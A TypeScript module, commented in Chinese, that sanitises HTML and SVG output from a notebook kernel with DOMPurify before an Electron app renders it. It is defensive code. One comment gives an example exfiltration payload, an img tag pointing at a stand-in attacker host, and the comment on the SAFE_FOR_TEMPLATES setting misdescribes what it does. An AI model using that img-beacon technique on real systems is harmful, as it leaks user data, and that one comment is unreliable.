/**
 * 内核富输出的消毒（任务 9.2 的安全要求）。
 *
 * 内核输出是**不可信内容**。它来自模型生成的代码，而模型生成的代码可能：
 * 打印用户上传文件里的内容、渲染从网上抓来的 HTML、或者在被诱导的情况下
 * 直接产出恶意脚本。渲染层跑在 Electron 里，一次 XSS 就等于拿到渲染进程的
 * 执行权，而渲染进程能通过 preload 桥调用后端。
 *
 * 因此走 DOMPurify 而不是自己写过滤。自己写过滤在安全上是错的做法——绕过手段
 * （畸形标签、编码变体、mutation XSS）多到没有人能靠手写正则覆盖完。
 */

import DOMPurify from 'dompurify';

/**
 * 允许的标签。
 *
 * 白名单而不是黑名单：黑名单会漏掉未来出现的标签，而漏掉的后果是它能执行。
 * 这份清单按「pandas 的 to_html、matplotlib 的表格输出、Jupyter 的富显示
 * 实际会用到什么」来定，不追求覆盖全部 HTML。
 */
const ALLOWED_TAGS = [
  'table',
  'thead',
  'tbody',
  'tfoot',
  'tr',
  'th',
  'td',
  'caption',
  'colgroup',
  'col',
  'div',
  'span',
  'p',
  'br',
  'hr',
  'pre',
  'code',
  'kbd',
  'samp',
  'strong',
  'b',
  'em',
  'i',
  'u',
  's',
  'sub',
  'sup',
  'ul',
  'ol',
  'li',
  'dl',
  'dt',
  'dd',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'blockquote',
  'img',
  'figure',
  'figcaption',
];

/**
 * 允许的属性。
 *
 * 刻意**不允许 style**。pandas 的 to_html 会带 style，去掉会让表格丑一些，
 * 但 style 是 CSS 注入的入口：`position:fixed` 加高 z-index 就能盖住整个界面，
 * 伪造一个假的审批卡片骗用户点同意。表格好看不值这个风险。
 *
 * 也不允许 class：内核输出的 class 名可能与应用样式冲突，让不可信内容能
 * 借用应用自己的样式伪装成界面元素。
 */
const ALLOWED_ATTR = [
  'colspan',
  'rowspan',
  'align',
  'valign',
  'scope',
  'alt',
  'title',
  /*
   * src 必须在白名单里，否则 img 的 src 会在下面那个钩子跑之前就被剥掉——
   * 结果是内核产出的图全部渲染成空白。实测漏了这一项时 matplotlib 的图
   * 一张都显示不出来，而 img 标签还在，看起来像是图片本身坏了。
   *
   * 放开 src 不等于放开任意来源：钩子会把非 data:image 的值移除。
   */
  'src',
];

let configured = false;

function configure(): void {
  if (configured) return;
  configured = true;

  /*
   * img 的 src 只允许 data: 形式的图片。
   *
   * 内核产出的图是 base64 内嵌的，不需要外链。允许 http(s) 的话，一段
   * `<img src="https://attacker/log?data=...">` 就成了数据外泄通道——而这个
   * 请求是渲染层发出的，看起来完全正常。
   */
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (!(node instanceof Element)) return;

    if (node.hasAttribute('src')) {
      // 只有 img 有正当理由带 src。放开属性白名单里的 src 之后，任何标签都
      // 可能携带它，因此这里对非 img 一律移除——白名单里没有 script/iframe，
      // 但少一个假设总是更安全
      if (node.tagName !== 'IMG') {
        node.removeAttribute('src');
      } else {
        const src = node.getAttribute('src') ?? '';
        if (!/^data:image\/(png|jpeg|gif|webp|svg\+xml);base64,/i.test(src)) {
          node.removeAttribute('src');
          node.setAttribute('alt', '[已移除：只允许内嵌的图片数据]');
        }
      }
    }

    // 兜底移除全部事件处理属性。DOMPurify 已经处理，这里是双保险——
    // 属性白名单不含 on* 时它们本就进不来，但显式移除让意图可读
    for (const attr of [...node.attributes]) {
      if (attr.name.toLowerCase().startsWith('on')) node.removeAttribute(attr.name);
    }
  });
}

/** 消毒内核产出的 HTML。 */
export function sanitizeHtml(html: string): string {
  configure();
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // 禁止 data-* 与 aria-*：内核输出不需要它们，而 data-* 可能被应用自己的
    // 脚本读取，形成一条从不可信内容到应用逻辑的通路
    ALLOW_DATA_ATTR: false,
    ALLOW_ARIA_ATTR: false,
    // 保留文本内容而不是整块丢弃：表格样式没了但数字还在，用户仍能核对
    KEEP_CONTENT: true,
    // 不允许 <template>、<mglyph> 这类可用于 mutation XSS 的结构
    SAFE_FOR_TEMPLATES: false,
    RETURN_DOM: false,
    RETURN_DOM_FRAGMENT: false,
  });
}

/** 消毒结果与是否发生了改动。UI 据此提示「部分内容已被移除」。 */
export function sanitizeWithReport(html: string): { html: string; modified: boolean } {
  const clean = sanitizeHtml(html);
  // 长度不等说明有东西被剥掉了。这个判断粗糙但方向安全：只会多报不会少报，
  // 而多报的代价只是一句提示
  return { html: clean, modified: clean.length !== html.length };
}

/** 从 MIME bundle 里挑一个可渲染的表示，按优先级。 */
export type RenderableOutput =
  | { kind: 'image'; mime: string; base64: string }
  | { kind: 'html'; html: string; modified: boolean }
  | { kind: 'text'; text: string }
  | { kind: 'unknown'; mimes: string[] };

const IMAGE_MIMES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/svg+xml'];

/**
 * 决定富输出怎么渲染。
 *
 * 图优先于 HTML 优先于纯文本：Jupyter 的输出常常同时带图和一段
 * 「<Figure size 640x480>」的纯文本，后者对用户毫无价值。
 */
export function pickRenderable(data: Record<string, unknown>): RenderableOutput {
  for (const mime of IMAGE_MIMES) {
    const value = data[mime];
    if (typeof value === 'string' && value !== '') {
      // SVG 走 HTML 路径消毒——它是可执行的 XML，内联脚本完全合法
      if (mime === 'image/svg+xml') {
        const { html, modified } = sanitizeWithReport(value);
        return { kind: 'html', html, modified };
      }
      return { kind: 'image', mime, base64: value };
    }
  }

  const html = data['text/html'];
  if (typeof html === 'string' && html !== '') {
    const result = sanitizeWithReport(html);
    return { kind: 'html', html: result.html, modified: result.modified };
  }

  const plain = data['text/plain'];
  if (typeof plain === 'string' && plain !== '') return { kind: 'text', text: plain };

  const json = data['application/json'];
  if (json !== undefined) {
    return { kind: 'text', text: JSON.stringify(json, null, 2) };
  }

  return { kind: 'unknown', mimes: Object.keys(data) };
}
